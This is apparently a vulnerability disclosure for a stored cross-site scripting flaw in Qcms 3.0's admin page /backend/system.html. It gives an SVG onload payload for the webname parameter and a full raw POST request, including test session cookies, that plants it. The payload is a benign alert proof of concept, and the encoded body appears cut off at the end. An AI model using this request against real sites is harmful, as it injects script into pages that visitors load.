# Qcms version 3.0 has xss via the webname parameter to the /backend/system.html URI

there is a xss in admin page `/backend/system.html` webname parameter.

set xss payload `<svg/onload=alert(0)>` to the webname parameter and save the edit then visite site `/index.php`,there is a alert box to show 0.

![](1.png)

	POST /backend/system.html HTTP/1.1
	Host: localhost
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
	Referer: http://localhost/backend/system.html
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 40
	Cookie: PHPSESSID=8sqolv5pb9kfljuh5g0b36tus6; admin_id=1; admin_level=1; admin_name=admin; admin_secret=f63fad88029cf8f923c35fafe1c6b5d1; UM_distinctid=162181544af9-0ca6b89389a11d8-4c322172-1fa400-162181544b04ce;
	Connection: close
	Upgrade-Insecure-Requests: 1
	
	webname=%3Csvg%2Fonload%3Dalert%280%29%3

![](2.png)
